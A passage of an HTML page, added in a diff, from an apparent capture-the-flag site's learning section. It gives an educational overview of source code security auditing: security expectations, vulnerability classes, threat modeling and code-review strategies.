@@ -1,0 +1,1666 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learn Code Auditing - Code Auditor CTF</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/c.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/cpp.min.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        document.querySelectorAll('pre code.language-c, pre code.language-cpp').forEach((el) => {
+        hljs.highlightElement(el);
+        });
+    });
+    </script>
+    <style>
+        /* Custom styles for dark theme, font, and specific elements */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0f172a; /* slate-900 */
+            color: #e2e8f0; /* slate-200 */
+        }
+        /* Gradient text effect */
+        .gradient-text {
+            background: linear-gradient(to right, #8b5cf6, #3b82f6); /* violet-500 to blue-500 */
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        /* Custom scrollbar for Webkit browsers */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1e293b; /* slate-800 */
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #475569; /* slate-600 */
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #64748b; /* slate-500 */
+        }
+        /* Styling for details/summary */
+        details > summary {
+            list-style: none; /* Remove default marker */
+            cursor: pointer;
+            padding: 0.75rem 1rem;
+            background-color: #1e293b; /* slate-800 */
+            border-radius: 0.5rem;
+            margin-bottom: 0.5rem;
+            transition: background-color 0.2s ease-in-out;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-weight: 600; /* Make summary text semi-bold */
+            color: #cbd5e1; /* slate-300 */
+        }
+        details > summary:hover {
+             background-color: #334155; /* slate-700 */
+        }
+        details > summary::after { /* Custom arrow */
+            content: '▼';
+            font-size: 0.8em;
+            transition: transform 0.2s ease-in-out;
+            color: #94a3b8; /* slate-400 */
+        }
+        details[open] > summary {
+             border-bottom-left-radius: 0; /* Flatten bottom corners when open */
+             border-bottom-right-radius: 0;
+        }
+        details[open] > summary::after {
+            transform: rotate(-180deg);
+        }
+        details > div {
+            /* Apply prose styles directly here for better control */
+            padding: 1rem 1rem 1rem 1.5rem; /* Increased left padding */
+            border-left: 2px solid #334155; /* slate-700 */
+            margin-left: 0.5rem; /* Indent content slightly relative to summary */
+            margin-top: -0.5rem; /* Pull content closer to summary */
+            border-bottom-left-radius: 0.5rem;
+            border-bottom-right-radius: 0.5rem;
+            background-color: #162033; /* Slightly different bg for content */
+        }
+        /* Code block styling */
+        pre {
+            background-color: #0f172a; /* alate-900 - Match body bg */
+            color: #e2e8f0; /* slate-200 */
+            padding: 1rem;
+            border-radius: 0.5rem;
+            overflow-x: auto; /* Allow horizontal scrolling for long code lines */
+            font-family: monospace;
+            font-size: 0.9em;
+            margin-top: 1rem;
+            margin-bottom: 1rem;
+            border: 1px solid #334155; /* slate-700 */
+        }
+        /* Ensure inline code uses monospace too */
+        article code:not(pre code) {
+        font-family: monospace;
+        background-color: #334155; /* Slightly different bg for inline */
+        padding: 0.1em 0.3em;
+        border-radius: 0.25rem;
+        font-size: 0.9em; /* Match pre font size */
+        color: #cbd5e1; /* slate-300 */
+        }
+        /* Sidebar specific styles */
+        #toc-sidebar {
+            scrollbar-width: thin; /* For Firefox */
+            scrollbar-color: #475569 #1e293b; /* thumb track */
+        }
+        #toc-sidebar ul ul:has(li) {
+            border-left: 1px solid #334155;
+        }   
+        #toc-sidebar li > div { /* Container for link and toggle */
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 2rem; /* Ensure consistent height */
+            padding: 0.1rem 0; /* Add small vertical padding */
+        }
+        #toc-sidebar .toc-toggle { /* Style for the toggle button */
+            cursor: pointer;
+            padding: 0.25rem 0.5rem; /* Give it slightly more clickable area */
+            margin-left: 0.25rem; /* Reduced margin */
+            color: #94a3b8; /* slate-400 */
+            transition: transform 0.2s ease-in-out;
+            flex-shrink: 0; /* Prevent shrinking */
+            user-select: none; /* Prevent text selection */
+            display: inline-block; /* Needed for transform */
+            border-radius: 0.25rem; /* Add slight rounding */
+        }
+        #toc-sidebar .toc-toggle:hover {
+             background-color: #334155; /* slate-700 */
+             color: #e2e8f0; /* slate-200 */
+        }
+         #toc-sidebar .toc-toggle.collapsed {
+             transform: rotate(-90deg);
+         }
+        #toc-sidebar a {
+            transition: color 0.2s ease-in-out, background-color 0.2s ease-in-out;
+            flex-grow: 1; /* Allow link to take available space */
+            min-width: 0; /* Prevent pushing toggle button out */
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            display: block; /* Ensure it takes block space */
+            padding: 0.25rem 0.5rem; /* Consistent padding */
+            border-radius: 0.25rem; /* Add rounding */
+        }
+         #toc-sidebar ul ul a {
+             padding-left: 0.5rem; /* Keep H3 links aligned */
+         }
+        #toc-sidebar a:hover {
+            color: #e2e8f0; /* slate-200 */
+            background-color: #334155; /* slate-700 */
+        }
+        #toc-sidebar a.active {
+             color: #c4b5fd; /* violet-300 */
+             background-color: #4338ca; /* indigo-700 */
+             font-weight: 600; /* Make active link bold */
+         }
+
+        /* Mobile toggle button */
+        #toc-toggle-btn {
+            position: fixed;
+            top: 5rem; /* Adjust position slightly */
+            left: 1rem;
+            z-index: 60; /* Above sidebar */
+            background-color: #1e293b; /* slate-800 */
+            color: #e2e8f0; /* slate-200 */
+            padding: 0.5rem;
+            border-radius: 0.375rem; /* rounded-md */
+            border: 1px solid #334155; /* slate-700 */
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+         /* Hide scrollbar on body when mobile menu is open */
+        body.overflow-hidden {
+            overflow: hidden;
+        }
+        /* C/C++ syntax highlighting */
+        .language-c .keyword, .language-cpp .keyword {
+            color: #c4b5fd; /* violet-300 */
+        }
+        .language-c .string, .language-cpp .string {
+            color: #86efac; /* green-300 */
+        }
+        .language-c .comment, .language-cpp .comment {
+            color: #94a3b8; /* slate-400 */
+            font-style: italic;
+        }
+        .language-c .function, .language-cpp .function {
+            color: #93c5fd; /* blue-300 */
+        }
+        .language-c .type, .language-cpp .type {
+            color: #fdba74; /* orange-300 */
+        }
+
+        details {
+            /* Add margin-bottom for spacing between sections */
+            margin-bottom: 1.5rem; /* Adjust value like 1rem or 2rem if needed */
+        }
+
+        /* Apply prose styles within details > div */
+        details > div {
+            /* Use Tailwind's prose classes for consistency */
+            @apply prose prose-invert max-w-none prose-headings:text-white prose-a:text-blue-400 hover:prose-a:text-blue-300 prose-strong:text-slate-100 prose-code:text-violet-300 prose-pre:bg-slate-800 prose-pre:text-slate-200 prose-blockquote:border-slate-600 prose-blockquote:text-slate-400;
+            /* Override specific prose styles if needed */
+            h3 { @apply text-xl font-semibold mb-3 mt-5; }
+            p { @apply mb-4; }
+            ul, ol { @apply mb-4 pl-6; }
+            li { @apply mb-1; }
+            pre { @apply my-5; } /* Adjust pre margins within details */
+        }
+        /* Improved heading hierarchy and text styling */
+        main article h1 {
+            font-size: 2.5rem;
+            margin-bottom: 2rem;
+            color: transparent;
+            background: linear-gradient(to right, #8b5cf6, #3b82f6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            line-height: 1.2;
+        }
+
+        main article h2 {
+            font-size: 1.8rem;
+            margin-top: 3rem;
+            margin-bottom: 1.5rem;
+            color: #f8fafc;
+            font-weight: 700;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 0.5rem;
+        }
+
+        main article h3 {
+            font-size: 1.4rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            color: #e2e8f0;
+            font-weight: 600;
+        }
+
+        main article h4 {
+            font-size: 1.2rem;
+            margin-top: 1.5rem;
+            margin-bottom: 0.75rem;
+            color: #cbd5e1;
+            font-weight: 600;
+        }
+
+        /* Fix for content inside details elements */
+        details > div h3 {
+            color: #a5b4fc; /* indigo-300 */
+            border-bottom: none;
+            margin-top: 1.5rem;
+        }
+
+        details > div h4 {
+            color: #93c5fd; /* blue-300 */
+            font-weight: 600;
+            margin-top: 1.2rem;
+        }
+
+        details > div p {
+            margin-bottom: 1rem;
+            line-height: 1.6;
+            font-size: 1rem;
+        }
+
+        details > div ul, 
+        details > div ol {
+            margin-top: 0.75rem;
+            margin-bottom: 1rem;
+            margin-left: 1.5rem;
+        }
+
+        details > div li {
+            margin-bottom: 0.5rem;
+            line-height: 1.5;
+            font-size: 1rem;
+        }
+
+        details > div li strong {
+            color: #c4b5fd; /* violet-300 */
+        }
+
+        /* Make the summary elements more prominent */
+        details > summary {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #f8fafc; /* slate-50 */
+            background-color: #1e293b; /* slate-800 */
+            transition: all 0.2s ease;
+        }
+
+        details > summary:hover {
+            background-color: #334155; /* slate-700 */
+        }
+
+        details[open] > summary {
+            background-color: #334155; /* slate-700 */
+            border-left: 3px solid #8b5cf6; /* violet-500 */
+        }
+
+        /* Make code blocks more readable */
+        code {
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+
+        pre {
+            margin: 1rem 0;
+            padding: 1rem;
+            background-color: #1e293b; /* slate-800 */
+            border-radius: 0.375rem;
+            overflow-x: auto;
+        }
+
+        pre code {
+            color: #e2e8f0; /* slate-200 */
+        }
+
+        h2, h3, h4 {
+            margin-top: 1.5rem;
+            margin-bottom: 1rem;
+            color: #f8fafc; /* slate-50 */
+            font-weight: 600;
+        }
+
+        h2 {
+            font-size: 1.75rem;
+            border-bottom: 1px solid #334155; /* slate-700 */
+            padding-bottom: 0.5rem;
+        }
+
+        h3 {
+            font-size: 1.4rem;
+        }
+
+        h4 {
+            font-size: 1.2rem;
+            color: #e2e8f0; /* slate-200 */
+        }
+
+        p {
+            margin-bottom: 1rem;
+            line-height: 1.6;
+        }
+
+        details > div ul, details > div ol {
+            margin-left: 1.5rem;
+            margin-bottom: 1rem;
+        }
+
+        details > div pre {
+           border: none; /* Remove border from code blocks inside details */
+        }
+
+        details > div li {
+            margin-bottom: 0.5rem;
+        }
+        
+    </style>
+</head>
+<body class="antialiased">
+
+    <nav class="py-4 px-6 md:px-10 sticky top-0 z-50 backdrop-blur-md bg-slate-900/70 border-b border-slate-800">
+        <div class="container mx-auto flex justify-between items-center">
+            <a href="/" class="text-2xl font-bold text-white">Code Auditor <span class="gradient-text">CTF</span></a>
+            <div>
+                <a href="/learn.html" class="text-violet-400 font-semibold px-3 py-2 rounded-md text-sm">Learn</a>
+                <a href="/ctf" class="ml-4 bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-md text-sm font-medium transition duration-150 ease-in-out">Start hacking</a>
+            </div>
+        </div>
+    </nav>
+
+    <button id="toc-toggle-btn" class="md:hidden" aria-label="Toggle Table of Contents" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" />
+        </svg>
+    </button>
+
+    <div class="flex flex-col md:flex-row max-w-screen-2xl mx-auto">
+        <aside id="toc-sidebar" class="fixed inset-y-0 left-0 z-40 w-64 md:w-72 lg:w-80 h-screen pt-20 pb-10 overflow-y-auto transition-transform duration-300 ease-in-out -translate-x-full bg-slate-900 border-r border-slate-800 md:translate-x-0" aria-label="Sidebar">            <div class="h-full px-3 py-4 overflow-y-auto">
+                <h3 class="text-lg font-semibold text-white mb-4 px-2">Table of Contents</h3>
+                <ul id="toc-list" class="space-y-1 font-medium text-slate-400">
+                    </ul>
+            </div>
+        </aside>
+
+        <main class="pt-20 md:pl-72 lg:pl-80 p-6 md:p-10 w-full min-h-screen">
+             <article class="max-w-none">
+                <h1 class="gradient-text mb-8 text-4xl md:text-5xl font-extrabold">Comprehensive Guide to Source Code Auditing</h1>
+
+                <h2 id="part-i-introduction-to-software-security-assessment" class="text-2xl md:text-3xl font-bold mt-8 mb-4 border-b border-slate-700 pb-2">Part I: Introduction to Software Security Assessment</h2>
+
+                <details open>
+                    <summary>Introduction & Core Concepts</summary>
+                    <div>
+                        <h3 id="preface">Preface</h3>
+                        <p>Software, though often perceived as inscrutable, deeply impacts daily life, raising questions about the security of systems we rely on. Software vulnerabilities are essentially weaknesses or bugs that attackers can exploit. Understanding these vulnerabilities involves looking past the apparent complexity to see how they work. Every software system operates under a security policy, which might be formally documented or exist as informal user expectations about reasonable system behavior. Vulnerabilities represent deviations from this policy that can be leveraged for attacks.</p>
+
+                        <h3 id="security-expectations">Security Expectations</h3>
+                        <p>Software security is often discussed based on three core components:</p>
+                        <ul>
+                            <li><strong>Confidentiality</strong>: Requires keeping information private and hidden from unauthorized access. This applies to various sensitive data, from national intelligence to personal information.</li>
+                            <li><strong>Integrity</strong>: Refers to the trustworthiness and correctness of data, ensuring it hasn't been altered improperly. It also relates to the authenticity of the data's source. Software maintains integrity by preventing unauthorized changes or detecting alterations.</li>
+                            <li><strong>Availability</strong>: Ensures that information and resources are accessible and usable when needed. This involves resilience against denial-of-service (DoS) attacks.</li>
+                        </ul>
+
+                        <h3 id="classifying-vulnerabilities">Classifying Vulnerabilities</h3>
+                        <p>Vulnerabilities can be grouped into classes based on common patterns or concepts. This classification helps in understanding and communication, though a single flaw might fit into multiple classes.</p>
+                        <ul>
+                            <li><strong>Design Vulnerabilities</strong>: Problems stemming from fundamental mistakes in the software's design or architecture. The software works as designed, but the design itself is insecure, often due to flawed assumptions about the environment or risks. Also known as high-level or architectural flaws.</li>
+                            <li><strong>Implementation Vulnerabilities</strong>: Issues arising from how the design is coded. These occur during development, often due to deviations from the design or specific nuances of the platform or language used. Also called low-level or technical flaws.</li>
+                            <li><strong>Operational Vulnerabilities</strong>: Security problems related to the software's configuration, deployment environment, or operational procedures, rather than the source code itself. Includes issues with configuration, supporting systems, and surrounding processes.</li>
+                        </ul>
+
+                        <h3 id="common-threads">Common Threads</h3>
+                        <p>Recurring themes often underlie software vulnerabilities:</p>
+                        <ul>
+                            <li><strong>Input and Data Flow</strong>: The majority of flaws arise from how a program responds to unexpected or malicious data inputs.</li>
+                            <li><strong>Trust Relationships</strong>: Different software components trust each other to varying degrees, affecting the level of validation applied to exchanged data. Understanding these is key.</li>
+                            <li><strong>Assumptions and Misplaced Trust</strong>: Developers might make incorrect assumptions about input data validity, environmental security, user capabilities, or API behavior, leading to vulnerabilities.</li>
+                            <li><strong>Attack Vectors</strong>: Common entry points for attacks include user input, interfaces (APIs, network sockets), environmental factors (configuration files, system settings), and how exceptional conditions are handled.</li>
+                        </ul>
+                   </div>
+                </details>
+
+                <details>
+                    <summary>Software Design Fundamentals</summary>
+                    <div>
+                        <h3 id="algorithms-and-problem-domain-logic">Algorithms and Problem Domain Logic</h3>
+                        <p>Software engineering involves developing and implementing algorithms. The design must specify key algorithms, data structures, and the rules (problem domain logic or business logic) the program follows. Security expectations for users and resources are a crucial part of this logic. Algorithm choices driven by performance needs should also be assessed for security implications.</p>
+
+                        <h3 id="abstraction-and-decomposition">Abstraction and Decomposition</h3>
+                        <p>Essential concepts for managing complexity:</p>
+                        <ul>
+                            <li><strong>Abstraction</strong>: Reducing complexity by isolating important elements and hiding unnecessary details. Used to model processes and create hierarchies.</li>
+                            <li><strong>Decomposition</strong>: Defining the generalizations and classifications within an abstraction. Can be top-down (specialization) or bottom-up (generalization).</li>
+                        </ul>
+
+                        <h3 id="principles-of-software-design">Principles of Software Design</h3>
+                        <ul>
+                            <li><strong>Coupling</strong>: The level of communication and interdependence between modules. Loosely coupled modules interact via well-defined interfaces, which is generally better for security and maintainability, especially across trust boundaries. Strongly coupled modules have complex dependencies, expose internal details, often trust each other highly, and perform less data validation, making them prone to flaws if one component is compromised. Look for strong coupling across trust boundaries.</li>
+                            <li><strong>Cohesion</strong>: A module's internal consistency and focus on related activities. Strong cohesion is desirable. Security issues can arise if a module handles multiple trust domains without proper decomposition, similar to coupling issues but occurring within a single module.</li>
+                        </ul>
+                    </div>
+                </details>
+
+                <details>
+                    <summary>Fundamental Design Flaws & Policy Enforcement</summary>
+                    <div>
+                        <h3 id="fundamental-design-flaws-examples">Fundamental Design Flaws Examples</h3>
+                        <ul>
+                            <li><strong>Exploiting Strong Coupling</strong>: Communication channels designed for one context might insecurely couple different trust domains in another (e.g., Windows message queue allowing messages between processes of different privilege levels on the same desktop). Security needs to be considered when designs evolve or environments change.</li>
+                            <li><strong>Exploiting Transitive Trusts</strong>: Attackers can manipulate trust between components. Accessing a public interface of one component might grant trusted access to another, more sensitive component if they share an implicit trust (e.g., running under the same user account). Lenient input validation based on assumed trust can exacerbate this (e.g., Solaris automountd vulnerability).</li>
+                            <li><strong>Failure Handling</strong>: Balancing usability and security during error handling is crucial. Usability might favor detailed error messages and recovery attempts, but security often dictates terminating sessions and providing minimal feedback to avoid aiding attackers who intentionally trigger errors. Security requirements may need to supersede usability in these cases.</li>
+                        </ul>
+
+                        <h3 id="enforcing-security-policy">Enforcing Security Policy</h3>
+                        <p>Key mechanisms for enforcing security:</p>
+                        <ul>
+                            <li><strong>Authentication</strong>: Verifying the identity of a user or system.</li>
+                            <li><strong>Authorization</strong>: Determining permissions for an authenticated entity.</li>
+                            <li><strong>Accountability</strong>: Logging actions to trace activity and ensure nonrepudiation. Crucial for post-incident analysis but often overlooked.</li>
+                            <li><strong>Confidentiality</strong>: Ensuring data is viewed only by authorized parties, using access control and encryption.</li>
+                            <li><strong>Availability</strong>: Ensuring resources are accessible when needed, protecting against DoS.</li>
+                        </ul>
+                    </div>
+                </details>
+
+                <details>
+                     <summary>Threat Modeling & Operational Review</summary>
+                     <div>
+                        <h3 id="threat-modeling">Threat Modeling</h3>
+                        <p>A structured process to identify potential threats:</p>
+                        <ol>
+                            <li><strong>Information Collection</strong>: Gather all available information.
+                                <ul>
+                                    <li>Identify Assets, Entry Points, External Entities, Trust Levels, Major Components, Use Scenarios.</li>
+                                    <li>Sources: Standard documentation (RFCs), Source Profiling (reviewing code structure, entry points), System Profiling (file layout, dependencies, imports/exports, sandboxing, network sniffing, scanning).</li>
+                                </ul>
+                            </li>
+                            <li><strong>Application Architecture Modeling</strong>: Understand the application structure and component interactions using models like DFDs. Review existing documentation or create new models.</li>
+                            <li><strong>Threat Identification</strong>: Use techniques like Attack Trees to map potential attack paths. The tree root is the goal, branches are steps. Document potential mitigations for identified threats.</li>
+                            <li><strong>Documentation of Findings</strong>: Summarize identified threats and provide remediation recommendations.</li>
+                        </ol>
+
+                        <h3 id="operational-review">Operational Review</h3>
+                        <p>Analyzing security aspects of deployment and configuration:</p>
+                        <ul>
+                            <li><strong>Exposure</strong>: Consider the deployment environment's impact (OS, network profile).</li>
+                            <li><strong>Insecure Defaults</strong>: Preconfigured settings that pose risks (e.g., no wireless encryption, default passwords) often chosen for ease of use. Review application defaults and installation options (passwords, secure communication modes, access control).</li>
+                            <li><strong>Access Control</strong>: How the application utilizes host OS or internal access control features.</li>
+                            <li><strong>Unnecessary Services</strong>: Enabled functionality not required for operation increases the attack surface. Often results from insecure defaults or including unneeded features.</li>
+                            <li><strong>Secure Channels</strong>: Ensuring communication confidentiality (e.g., encryption over networks, proper access control on local channels like named pipes).</li>
+                            <li><strong>Spoofing and Identification</strong>: Weaknesses allowing impersonation; deployment might introduce risks not addressed by the application design alone.</li>
+                            <li><strong>Network Profiles</strong>: Different protocols have different risk levels depending on network location (e.g., NFS/SMB inside vs. outside a firewall). Developers need to choose sensible defaults and document security concerns for various deployment scenarios.</li>
+                        </ul>
+
+                        <h3 id="protective-measures">Protective Measures</h3>
+                        <p>Defense-in-depth mechanisms applied during or after development:</p>
+                        <ul>
+                            <li><strong>Development Time</strong>: Secure coding practices, safer languages/libraries.</li>
+                            <li><strong>Host-Based</strong>: OS hardening, security software (AV, HIDS), memory protections (ASLR, Stack/Heap Protection, Non-executable Memory), sanitizers.</li>
+                            <li><strong>Network-Based</strong>: Firewalls, IDS/IPS.</li>
+                            <li><em>Note</em>: These measures exist outside the core application code but affect overall security; they can also introduce their own vulnerabilities.</li>
+                        </ul>
+                    </div>
+                </details>
+
+                <h2 id="the-application-review-process" class="text-2xl md:text-3xl font-bold mt-8 mb-4 border-b border-slate-700 pb-2">The Application Review Process</h2>
+
+                <details>
+                    <summary>Rationale & Process Outline</summary>
+                    <div>
+                        <h3 id="rationale">Rationale</h3>
+                        <p>Effective code review requires a pragmatic, flexible, results-driven approach. It's a creative process requiring understanding developer intent and hypothesizing unexpected behaviors, making it a skill developed over time. A rigid, step-by-step methodology is unrealistic, but a structured process enhances effectiveness, consistency, and manageability.</p>
+
+                        <h3 id="process-outline">Process Outline</h3>
+                        <p>A flexible four-phase process:</p>
+                        <ol>
+                            <li><strong>Preassessment</strong>: Planning, scoping the review, collecting initial information.</li>
+                            <li><strong>Application Review</strong>: The core assessment phase, iteratively applying various strategies to cover design, logic, implementation, and operational aspects simultaneously.</li>
+                            <li><strong>Documentation and Analysis</strong>: Collecting, documenting findings, conducting risk analysis, suggesting remediation.</li>
+                            <li><strong>Remediation Support</strong>: Assisting developers with fixes and verification.</li>
+                        </ol>
+                    </div>
+                </details>
+
+                 <details>
+                    <summary>Preassessment & Review Strategy</summary>
+                    <div>
+                        <h3 id="preassessment-details">Preassessment Details</h3>
+                        <ul>
+                            <li><strong>Scoping</strong>: Define the goal clearly (e.g., find biggest flaws fast vs. comprehensive coverage within budget/time).</li>
+                            <li><strong>Application Access</strong>: The type of access dictates methodology:
+                                <ul>
+                                    <li>Source only: Static analysis focus.</li>
+                                    <li>Binary only: Reverse engineering, dynamic analysis focus.</li>
+                                    <li>Source and binary: Most efficient, combines static and dynamic.</li>
+                                    <li>Checked build: Binary with debug info, aids analysis.</li>
+                                    <li>Strict black box: Only external testing (fuzzing).</li>
+                                </ul>
+                            </li>
+                            <li><strong>Information Collection</strong>: Gather details via developer interviews, documentation, standards, source profiling, system profiling.</li>
+                        </ul>
+
+                        <h3 id="application-review-strategy">Application Review Strategy</h3>
+                        <p>An iterative approach is often best, as understanding deepens over time. Avoid rigid waterfall-style reviews where design review happens only at the start when knowledge is lowest.</p>
+                        <ul>
+                            <li><strong>Avoid Drowning</strong>: Switch between different techniques periodically to maintain focus and motivation, and cover different vulnerability types. Recognize that intense concentration is limited.</li>
+                            <li><strong>Iterative Process</strong>: Repeat a cycle of Plan -> Work -> Reflect.
+                                <ul>
+                                    <li><strong>Plan</strong>: Decide the next target/goal or auditing strategy for a manageable work block (2-8 hours). Examples: Identify entry points, list uses of unsafe functions, trace a complex path.</li>
+                                    <li><strong>Work</strong>: Execute the strategy, taking extensive notes. Maintain a master list of ideas/potential issues.</li>
+                                    <li><strong>Reflect</strong>: Check progress, focus, time management. Ask: What learned? Focusing correctly? Sidetracked? Notes adequate? Models accurate? Re-evaluate the plan if needed, but don't mistake lack of findings for a flawed plan immediately. Take breaks as needed, either by switching tasks or stepping away completely. Don't fall down rabbit holes; balance depth with coverage and deadlines.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Initial Preparation</strong>: Decide on review structure:
+                                <ul>
+                                    <li><strong>Top-Down</strong>: Start from design/threat model, refine by assessing implementation along key paths. Good if docs are accurate, risky otherwise.</li>
+                                    <li><strong>Bottom-Up</strong>: Start from implementation details, build understanding upwards. Thorough but potentially slow. Maintain a design model as you go.</li>
+                                    <li><strong>Hybrid</strong>: Combine approaches, often best when design docs are lacking. Start by identifying high-level characteristics (purpose, assets, entry points, components, trust boundaries) and refine iteratively.</li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+                </details>
+
+                <details>
+                    <summary>Code-Auditing Tactics</summary>
+                    <div>
+                        <h3 id="code-auditing-tactics">Code-Auditing Tactics</h3>
+                        <p>Techniques to apply during the review:</p>
+                        <ul>
+                            <li><strong>Code Navigation</strong>: Understand how code flows.
+                                <ul>
+                                    <li><strong>External Flow Sensitivity</strong>: Analyze how execution proceeds between functions, considering control flow (following calls) and data flow (tracking variable use). Often, reviewing functions in isolation (insensitive) is more efficient initially.</li>
+                                    <li><strong>Tracing Direction</strong>: Forward tracing (from entry point) evaluates functionality; backward tracing (from candidate point) evaluates reachability. Back-tracing is often faster but relies on good candidate point identification and can miss logic flaws.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Internal Flow Analysis</strong>: Analyze control and data flow <em>within</em> a function. Carefully examine all relevant code paths, including error-checking branches and complex (pathological) paths, as these are often less tested.</li>
+                            <li><strong>Subsystem and Dependency Analysis</strong>: Familiarize yourself with shared components (custom allocators, string handlers, parsers) and standard library functions used, including their potential quirks and side effects.</li>
+                            <li><strong>Re-Reading Code</strong>: Multiple passes over the same code are often necessary to consider different vulnerability classes or fully understand complex logic. Ask detailed questions even about simple-looking code (global variable changes, initialization, return value handling).</li>
+                            <li><strong>Desk-Checking</strong>: Manually trace variables through code with specific input values to understand complex logic or side effects.</li>
+                            <li><strong>Test Cases</strong>: Use specific inputs (manually, via debugger, or with small test programs) to verify behavior, especially at boundaries or with unexpected values.</li>
+                        </ul>
+                    </div>
+                </details>
+
+                <details>
+                    <summary>Code-Auditing Strategies</summary>
+                    <div>
+                        <h3 id="code-auditing-strategies">Code-Auditing Strategies</h3>
+                        <p>Methods for approaching the code:</p>
+                        <ul>
+                            <li><strong>Code Comprehension (CC)</strong>: Focus on understanding the code directly.
+                                <ul>
+                                    <li><strong>CC1: Trace Malicious Input</strong>: Follow potentially tainted data from entry points, looking for unsafe operations. Requires experience; can be difficult in complex/OO code.</li>
+                                    <li><strong>CC2: Analyze a Module/File</strong>: Read code line-by-line within a file/module, taking notes on potential issues without necessarily tracing every call. Builds deep understanding but is taxing and risks reviewing non-relevant code.</li>
+                                    <li><strong>CC3: Analyze an Algorithm</strong>: Focus line-by-line analysis on a specific, security-relevant algorithm (e.g., crypto, security model enforcement, input processing).</li>
+                                    <li><strong>CC4: Analyze a Class/Object</strong>: Similar to CC2/CC3 but focused on a class; effective for OO code.</li>
+                                    <li><strong>CC5: Trace Black Box Hits</strong>: Investigate crashes or anomalies found via fuzzing/manual testing by tracing the problematic input/scenario in the source code. Requires a working application version.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Candidate Point (CP)</strong>: Identify potential issues (candidate points) first, then verify. Faster for common bugs but less comprehensive.
+                                <ul>
+                                    <li><strong>CP1: General Candidate Point Approach</strong>: Identify potentially unsafe constructs (e.g., <code>sprintf</code> use, dynamic SQL) via tools or knowledge, then back-trace to see if reachable with untrusted input. Verification required for each candidate. Relies on assumptions about what constitutes a vulnerability.</li>
+                                    <li><strong>CP2: Automated Source Analysis Tools (SAST)</strong>: Use tools to find candidate points based on known patterns. Can cover large codebases but suffer from false positives, high cost/effort, and inability to find novel or complex logic/design flaws. Technology is improving but best used to augment manual review.</li>
+                                    <li><strong>CP3: Simple Lexical Candidate Points</strong>: Use text search (<code>grep</code>, <code>findstr</code>) for specific vulnerable patterns (e.g., <code>printf</code> with non-static format string, <code>strcpy</code>, <code>../</code>). Filter list based on context (e.g., handles user input?) then verify using CP1.</li>
+                                    <li><strong>CP4: Simple Binary Candidate Points</strong>: Search compiled binaries for patterns when source is unavailable (e.g., specific instructions like <code>movsx</code> for sign extension issues, or string literals corresponding to vulnerable functions). Verify as with CP3.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Design Generalization (DG)</strong>: Infer high-level design/logic from implementation to find flaws. Requires good code understanding.
+                                <ul>
+                                    <li><strong>Model the System</strong>: Build/refine design models based on code analysis.</li>
+                                    <li><strong>Hypothesis Testing</strong>: Formulate and test hypotheses about design assumptions or expected behavior based on code.</li>
+                                    <li><strong>Deriving Purpose and Function</strong>: Understand what components <em>actually</em> do based on implementation, compare with intended function.</li>
+                                    <li><strong>Design Conformity Check</strong>: Compare implementation against documented or inferred design to find discrepancies.</li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+                </details>
+
+                <details>
+                    <summary>Auditing Tips & Considerations</summary>
+                    <div>
+                        <h3 id="auditing-tips-considerations">Auditing Tips & Considerations</h3>
+                        <ul>
+                            <li><strong>Variable Relationships</strong>: Identify variables whose values depend on each other or represent a combined state. Check if code paths exist where these related variables can become desynchronized or inconsistent.</li>
+                            <li><strong>Structure/Object Mismanagement</strong>: In OO code or code using complex structs, understand the purpose of members and interfaces. Look for ways to desynchronize related members or leave objects in unexpected states.</li>
+                            <li><strong>Initialization</strong>: Check if code paths exist where variables might be read before being initialized. Pay attention to cleanup code (epilogues) jumped to from multiple locations and functions assuming variables are initialized elsewhere.</li>
+                            <li><strong>Arithmetic Boundaries</strong>: Follow a structured process:
+                                <ol>
+                                    <li>Find operations where boundary conditions (overflow/underflow) have security impact (e.g., length calculations, comparisons).</li>
+                                    <li>Determine input values triggering the boundary condition.</li>
+                                    <li>Check if the vulnerable code path is reachable with those values, considering type constraints and validation checks.</li>
+                                </ol>
+                            </li>
+                            <li><strong>Type Confusion</strong>: Be wary of <code>union</code> types where the code might misinterpret which member is active, especially confusing pointers and integers or different struct types. Check the logic controlling union interpretation.</li>
